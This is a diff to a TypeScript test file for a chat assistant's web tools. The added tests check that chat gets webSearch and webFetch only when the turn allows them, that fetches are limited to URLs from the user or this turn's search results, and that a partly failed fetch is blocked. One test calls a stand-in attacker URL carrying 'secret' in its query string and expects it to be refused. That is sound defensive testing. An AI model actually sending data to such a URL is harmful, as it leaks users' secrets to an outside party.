@@ -8,7 +8,7 @@ import { searchInputSchema, batchSearchInputSchema, workspaceChatInputSchema } f
 import { currentSearchSignal } from "../search/query-bounds.js";
 import { currentChatAgentSignal } from "../lib/chat-agent-context.js";
 
-function setup(ids = ["search"], options: { toolBudgetMs?: () => number } = {}) {
+function setup(ids = ["search"], options: { toolBudgetMs?: () => number; webTools?: boolean; userText?: string[] } = {}) {
   const dispatch = vi.fn<McpDispatch>(async () => Response.json({ results: [] }));
   const onActivity = vi.fn();
   const controller = new AbortController();
@@ -52,6 +52,37 @@ describe("chat MCP tools", () => {
   it("does not offer ingestion tools that fetch URLs or start paid work (G-04)", () => {
     const t = setup(["search", "upload", "completeUpload", "listWorkspaces"]);
     expect(Object.keys(t.tools)).toEqual(["search"]);
+  });
+
+  it("offers only webSearch and webFetch to chat, and only when the turn allows web tools", () => {
+    const ids = ["search", "webSearch", "webFetch", "webMap", "webCrawl", "ingestWebsite"];
+    expect(Object.keys(setup(ids).tools)).toEqual(["search"]);
+    expect(Object.keys(setup(ids, { webTools: true }).tools)).toEqual(["search", "webSearch", "webFetch"]);
+  });
+
+  it("lets webFetch read only URLs from the user's messages or this turn's web search results", async () => {
+    const denied = setup(["webSearch", "webFetch"], { webTools: true });
+    expect(await denied.execute("webFetch", { urls: ["https://attacker.example/?q=secret"] }, "a")).toMatchObject({ code: "url_not_allowed", blocked: true });
+    expect(denied.dispatch).not.toHaveBeenCalled();
+    await expect(denied.execute("webSearch", { query: "retry" }, "b")).rejects.toMatchObject({ code: "chat_tool_failed" });
+    const t = setup(["webSearch", "webFetch"], { webTools: true, userText: ["Summarize https://docs.example.com/guide/, please."] });
+
+    await t.execute("webFetch", { urls: ["https://docs.example.com/guide#intro"] }, "b");
+    expect(t.dispatch).toHaveBeenCalledOnce();
+
+    t.dispatch.mockResolvedValueOnce(Response.json({ results: [{ url: "https://news.example.org/story" }] }));
+    await t.execute("webSearch", { query: "story" }, "c");
+    await t.execute("webFetch", { urls: ["https://news.example.org/story/"] }, "d");
+    expect(t.dispatch).toHaveBeenCalledTimes(3);
+    expect(JSON.parse(t.dispatch.mock.calls[2]![1]!.body as string).workspace).toBe("selected");
+  });
+
+  it("blocks partially failed web fetches instead of presenting the successful pages as completion", async () => {
+    const t = setup(["webFetch"], { webTools: true, userText: ["https://example.com/a https://example.com/b"] });
+    t.dispatch.mockResolvedValueOnce(Response.json({ pages: [{ url: "https://example.com/a", markdown: "Partial content" }], failed: [{ url: "https://example.com/b", reason: "timeout" }] }));
+    await expect(t.execute("webFetch", { urls: ["https://example.com/a", "https://example.com/b"] })).resolves.toMatchObject({ blocked: true, code: "partial_failure" });
+    expect(t.failure).toMatchObject({ code: "chat_tool_failed" });
+    expect(t.citations).toEqual([]);
   });
 
   it("bounds calls and honors cancellation before dispatch", async () => {
